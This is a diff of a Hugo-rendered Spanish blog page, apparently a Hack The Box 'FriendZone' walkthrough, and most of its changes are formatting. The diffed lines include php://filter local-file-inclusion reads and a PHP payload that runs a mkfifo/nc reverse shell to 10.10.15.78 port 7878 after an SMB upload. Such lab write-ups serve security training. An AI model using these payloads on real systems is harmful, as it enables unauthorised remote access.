@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="FriendZone es una maquina CTF Like donde encontramos una vulnerabilidad LFI en uno de los subdominios donde obtuvimos acceso en conjunto con un recurso de SAMBA. Encontramos en un archivo de configuracion una contraseña para el siguiente usuario para finalmente realizar Python Library Hijacking para escalar privilegios.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.80.0" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1591,19 +1591,19 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/smbclient/" class="single__tag" title="smbclient">smbclient</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/dig/" class="single__tag" title="dig">dig</a></li>
+  
+
   <li><a href="https://sckull.github.io/tags/lfi/" class="single__tag" title="lfi">lfi</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">cron</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/smbclient/" class="single__tag" title="smbclient">smbclient</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/python-library-hijacking/" class="single__tag" title="python library hijacking">python library hijacking</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/dig/" class="single__tag" title="dig">dig</a></li>
   
 
 </ul>
@@ -1730,7 +1730,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </div><h1 id="ftp">FTP</h1>
 <p>Haciendo un login como usuario anonimo no encontramos nada en este puerto.</p>
 <h1 id="enumeration">ENUMERATION</h1>
-<h2 id="http-">HTTP</h2>
+<h2 id="http">HTTP</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1748,7 +1748,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </div><p>Ninguno de los directorios y archivos encontrados en el puerto 80 (HTTP) son de ayuda, pero en el index de la pagina aparece un dominio que podriamos utilizar.</p>
 <p><img src="/images/posts/htb/friendzone/Screenshot_20190210_202543.webp" alt="image" /></p>
 <p><code>friendzoneportal.red</code>. Agregamos el dominio al archivo host (<code>/etc/hosts</code>) y encontramos que la pagina tiene contenido en el protocolo https, procedemos a enumerar los directorios y archivos.</p>
-<h2 id="https-">HTTPS</h2>
+<h2 id="https">HTTPS</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1855,7 +1855,7 @@ smb: <span class="se">\&gt;</span> ls
   php-reverse-shell.php               N     <span class="m">5493</span>  Sat Feb  <span class="m">9</span> 18:47:48 <span class="m">2019</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="subdominios-">SUBDOMINIOS</h2>
+</div><h2 id="subdominios">SUBDOMINIOS</h2>
 <p>Utilizando la ip y el dominio anteriormente utilizado en https, encontramos varios subdominios:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2015,7 +2015,7 @@ Si nos concentramos en la solicitud de la pagina podemos ver que existe un param
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="c1">//echo &#34;&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;&#34;;
 </span><span class="c1">//echo &#34;&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;&#34;;
@@ -2044,8 +2044,8 @@ Si nos concentramos en la solicitud de la pagina podemos ver que existe un param
 <span class="p">}</span><span class="k">else</span><span class="p">{</span>
 <span class="k">echo</span> <span class="s2">&#34;&lt;center&gt;&lt;p&gt;You can&#39;t see the content ! , please login !&lt;/center&gt;&lt;/p&gt;&#34;</span><span class="p">;</span>
 <span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p><code>pagename=php://filter/convert.base64-encode/resource=timestamp</code></p>
 <div class="highlight"><div class="chroma">
@@ -2056,11 +2056,11 @@ Si nos concentramos en la solicitud de la pagina podemos ver que existe un param
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$time_final</span> <span class="o">=</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">;</span>
 <span class="k">echo</span> <span class="s2">&#34;Final Access timestamp is </span><span class="si">$time_final</span><span class="s2">&#34;</span><span class="p">;</span>
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p><code>pagename=php://filter/convert.base64-encode/resource=../www/admin/login</code></p>
 <div class="highlight"><div class="chroma">
@@ -2084,7 +2084,7 @@ Si nos concentramos en la solicitud de la pagina podemos ver que existe un param
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">];</span>
 <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">];</span>
 
@@ -2100,8 +2100,8 @@ Si nos concentramos en la solicitud de la pagina podemos ver que existe un param
 <span class="k">echo</span> <span class="s2">&#34;Wrong !&#34;</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><h1 id="obteniendo-acceso">OBTENIENDO ACCESO</h1>
 <p>Anteriormente pudimos obtener el codigo fuente de las paginas locales y accesso a dos de los sharenames disponibles en el servicio de samba, pero en uno de ellos nos indica que la carpeta local del sharename <code>Files</code> es en <code>/etc/Files</code> por lo que concluimos que <code>Development y general</code> estan en la carpeta <code>/etc/Development</code> y <code>/etc/general</code>, de los cuales solo tenemos acceso a <code>Development</code>, procedemos a subir un archivo en samba con el sharename <code>Development</code> y hacer una solicitud a la carpeta <code>/etc/Development/NuestroArchivo</code>.</p>
@@ -2110,7 +2110,7 @@ Si nos concentramos en la solicitud de la pagina podemos ver que existe un param
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php:batman.php" data-lang="php:batman.php">echo &#39;<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&#34;&lt;/center&gt;&lt;h1&gt;Yo soy Batman&lt;/h1&gt;&lt;/center&gt;&#34;</span><span class="p">;</span><span class="cp">?&gt;</span>&#39; &gt; batman.php
+<pre class="chroma"><code class="language-php:batman.php" data-lang="php:batman.php"><span class="k">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;/center&gt;&lt;h1&gt;Yo soy Batman&lt;/h1&gt;&lt;/center&gt;&#34;;?&gt;&#39;</span> <span class="o">&gt;</span> <span class="nx">batman</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="smbclient">Smbclient</h2>
@@ -2129,8 +2129,8 @@ putting file batman.php as \batman.php (0.0 kb/s) (average 0.0 kb/s)
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">echo &#39;<span class="cp">&lt;?php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.78 7878 &gt;/tmp/f&#34;</span><span class="p">);</span><span class="cp">?&gt;</span>&#39; &gt; batman_sh.php
-put batman_sh.php
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">echo</span> <span class="s1">&#39;&lt;?php system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.78 7878 &gt;/tmp/f&#34;);?&gt;&#39;</span> <span class="o">&gt;</span> <span class="nx">batman_sh</span><span class="o">.</span><span class="nx">php</span>
+<span class="nx">put</span> <span class="nx">batman_sh</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/htb/friendzone/Screenshot_20190212_191406.webp" alt="image" /></p>
@@ -3654,10 +3654,10 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#ftp">FTP</a></li>
     <li><a href="#enumeration">ENUMERATION</a>
       <ul>
-        <li><a href="#http-">HTTP</a></li>
-        <li><a href="#https-">HTTPS</a></li>
+        <li><a href="#http">HTTP</a></li>
+        <li><a href="#https">HTTPS</a></li>
         <li><a href="#samba">Samba</a></li>
-        <li><a href="#subdominios-">SUBDOMINIOS</a></li>
+        <li><a href="#subdominios">SUBDOMINIOS</a></li>
         <li><a href="#enumerando-directorios">ENUMERANDO DIRECTORIOS</a>
           <ul>
             <li><a href="#friendzonered">friendzone.red</a></li>
